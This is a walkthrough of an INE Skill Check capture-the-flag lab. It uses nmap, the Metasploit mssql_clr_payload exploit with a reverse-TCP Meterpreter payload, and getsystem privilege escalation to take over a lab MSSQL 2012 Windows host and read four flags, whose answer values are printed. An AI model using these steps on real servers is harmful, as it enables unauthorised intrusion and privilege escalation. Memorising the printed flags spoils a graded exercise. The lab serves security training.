### Completing Skill Check Labs

Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.

# Lab Environment

In this lab environment, you will have GUI access to a Kali machine. The target machine will be accessible at **target.ine.local**.

**Objective:** Use Metasploit and manual investigation techniques to capture the following flags:

- **Flag 1:** Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag.
- **Flag 2:** Locate the second flag within the Windows configuration folder.
- **Flag 3:** The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag.
- **Flag 4:** Investigate the Administrator directory to find the fourth flag.

# Tools

The best tools for this lab are:

- Nmap
- Metasploit Framework
- mssql

&nbsp;

![89e186484d4b897ea7f255df00c32570.png](../../../_resources/89e186484d4b897ea7f255df00c32570.png)

**Flag 1: Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag.**

As always, lets find the target IP

![9fb901c33dc9348e2fdd03eeda9de3ea.png](../../../_resources/9fb901c33dc9348e2fdd03eeda9de3ea.png)

nmap -sC -sV target.ine.local

This command performs a service and version scan (`-sC -sV`)

![9dfd837c9bae4ef8d84ded4ee3429a19.png](../../../_resources/9dfd837c9bae4ef8d84ded4ee3429a19.png)

Now that we know **MSSQL Server** is running on **port 1433**, and the version is **SQL Server 2012 (11.00.6020.00; SP3)**, lets search for an exploit based on this version.

Start Metasploit by typing: `msfconsole`. Once inside Metasploit, search for available exploits related to **MSSQL 2012** using `search MSSQL 2012`.

![c543da2d63709feaaa13d0d8dc85a84d.png](../../../_resources/c543da2d63709feaaa13d0d8dc85a84d.png)

![17321b95d1747ef2a5484daaa92030ae.png](../../../_resources/17321b95d1747ef2a5484daaa92030ae.png)

At the top, we can see the relevant exploit. To select it, use the following command: use 0 or

use exploit/windows/mssql/mssql_clr_payload

![d30d0c151c2c9a6070d0dedbb943f1a4.png](../../../_resources/d30d0c151c2c9a6070d0dedbb943f1a4.png)

We can also get detailed information about this module by using the `info` command. The description confirms that this exploit has been tested on **SQL Server 2012**, so it is suitable for our target.

show options

![558c4189e0a88d5ded2e792a3673e07a.png](../../../_resources/558c4189e0a88d5ded2e792a3673e07a.png)

Now, we can proceed with configuring the required options before executing the exploit..We need to specified RHOST because it is required.

set RHOSTS target.ine.local

![7507f30c28a5109f13db2306c429c5c4.png](../../../_resources/7507f30c28a5109f13db2306c429c5c4.png)

Run the exploit by typing: run or exploit

Press enter or click to view image in full size

![ed836a1b60597663f8f0eebeefc33ecf.png](../../../_resources/ed836a1b60597663f8f0eebeefc33ecf.png)

Since the exploit supports **x86** architecture, but we are targeting a **64-bit** system, we need to set a compatible payload.

set PAYLOAD windows/x64/meterpreter/reverse_tcp

![f96f75725389b04f1eb4bec02abc6d01.png](../../../_resources/f96f75725389b04f1eb4bec02abc6d01.png)

Now that we have a successful **Meterpreter** session and you can check some information

![5027c7f6511bac19218505077a8d035c.png](../../../_resources/5027c7f6511bac19218505077a8d035c.png)

Type the following command shell to create a session

This will drop us into a regular command shell on the target machine.

![b4444b763bf4061da90bd1dd6ddba7c9.png](../../../_resources/b4444b763bf4061da90bd1dd6ddba7c9.png)

To find the first flag, navigate to the **C** drive by typing: `cd C:\` .

List the contents of the directory to find the file that contains the flag: `dir`

![2fc0d00687971dfb87937a4ca58f0429.png](../../../_resources/2fc0d00687971dfb87937a4ca58f0429.png)

Now that we’ve located the flag, we can use the type command to read its content.

![c62f375c1a18fa3688e778003fefd8dd.png](../../../_resources/c62f375c1a18fa3688e778003fefd8dd.png)

Answer: 1be3a92994994744be332aab8417450f

**Flag 2: Locate the second flag within the Windows configuration folder.**

For the second flag, we want to check the **Windows configuration folder**, which is usually found in the `System32` directory. To navigate to it, type the following command: `cd Windows\System32`

![1a8a24760e6fe1786bf083a8d29f32cc.png](../../../_resources/1a8a24760e6fe1786bf083a8d29f32cc.png)

or you can navigate manually

![fb8f815df69897a22a092461239946ee.png](../../../_resources/fb8f815df69897a22a092461239946ee.png)

![02f1d9ec755ceea6fc860b5c9332f778.png](../../../_resources/02f1d9ec755ceea6fc860b5c9332f778.png)

To list only the directories in the `System32` folder, use the following command: `dir /a:d` . This will filter the results and show only the directories.

![9c57627c3ca220abd29f2cc54ba11534.png](../../../_resources/9c57627c3ca220abd29f2cc54ba11534.png)

Now that we can see the **config** folder, navigate into it using the `cd` command.cd

![fc9927823f3466226b0d515522164629.png](../../../_resources/fc9927823f3466226b0d515522164629.png)

We don’t have access to view the contents. To check this, we need to first review our privileges. Let’s get back to our Meterpreter session by using **Ctrl + C**. Then, type `getprivs` to view the privileges that the current user has.

![5b33695b7121371d914193a730a2da38.png](../../../_resources/5b33695b7121371d914193a730a2da38.png)

These privs are for the user. We can use `getsystem` to elevate the privileges because if `SeImpersonatePrivilege` is present, `getsystem` is likely to succeed using Named Pipe Impersonation.

![9222596dbbd0c2c61045a008bd58d9f2.png](../../../_resources/9222596dbbd0c2c61045a008bd58d9f2.png)

We have elevated our privileges. Now, we can use the `shell` command again to get the shell and continue searching for the second flag.

![ba12525d073cc0b930783b5eb795bd58.png](../../../_resources/ba12525d073cc0b930783b5eb795bd58.png)

Lets first check Configuration directory

![3d7ad324ef23d4297dfa9607c96e1548.png](../../../_resources/3d7ad324ef23d4297dfa9607c96e1548.png)

nothing is found and we can check config directory

We have successfully entered the **config** directory. Type `dir` to list the contents.cd

![50a797c7d4ffc6b19132741fe192265e.png](../../../_resources/50a797c7d4ffc6b19132741fe192265e.png)

We have found the second flag. To read its contents, use the command `type flag2.txt`.

![333f3dcf3e3952b30700f6c5cc55c0fd.png](../../../_resources/333f3dcf3e3952b30700f6c5cc55c0fd.png)

Answer: 6d155803a67e46ce8b9dcffef496d122

**Flag 3: The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag.**

The question states that the third flag is also hidden within the **system** directory, but we don’t know its exact location. However, we know that the flag files end with `.txt`. To search for those files, use the following command: dir C:\\Windows\\System32\\\*.txt /s /b

This command will search for all `.txt` files within the **System32** directory and its subdirectories.

![c18d874992137a9fe1dede1d30b16289.png](../../../_resources/c18d874992137a9fe1dede1d30b16289.png)

We see a file named **EscalatePrivilageToGetThisFlag.txt**. To read its contents, type the following command:

type C:\\Windows\\System32\\drivers\\etc\\EscaltePrivilageToGetThisFlag.txt

![9588b8ce733e01fb8ddc56b1539f909b.png](../../../_resources/9588b8ce733e01fb8ddc56b1539f909b.png)

Answer: 15e39928a9b34c49b36cbc1872e15ec6

**Flag 4: Investigate the Administrator directory to find the fourth flag.**

Since we have already elevated our privileges, let’s navigate to the **Administrator** directory to find the fourth flag.

You can navigate to **Administrator** directory with cd C:\\Users\\Administrator

![4f3e9a99676eb8db328dcc8efee0828e.png](../../../_resources/4f3e9a99676eb8db328dcc8efee0828e.png)

or Manually

![6510dcdb0b708bd5dc714ab40a25f932.png](../../../_resources/6510dcdb0b708bd5dc714ab40a25f932.png)

![e2c5a61eda24e12fe4d689f92effc742.png](../../../_resources/e2c5a61eda24e12fe4d689f92effc742.png)

To list the contents, type `dir`. Let's navigate to the **Desktop** directory.

![1d393885cb1706fd0c08dfe426b80347.png](../../../_resources/1d393885cb1706fd0c08dfe426b80347.png)

![d8a5da61dc34a8e4bc7bef3aea0ba52a.png](../../../_resources/d8a5da61dc34a8e4bc7bef3aea0ba52a.png)

And here we have found our last flag, which is:

![607f1608c988f069371b4d48297b31a6.png](../../../_resources/607f1608c988f069371b4d48297b31a6.png)

Answer: c8bd568633a24d87967c361d062fd047

![f276690e56807b353e602532bca564c7.png](../../../_resources/f276690e56807b353e602532bca564c7.png)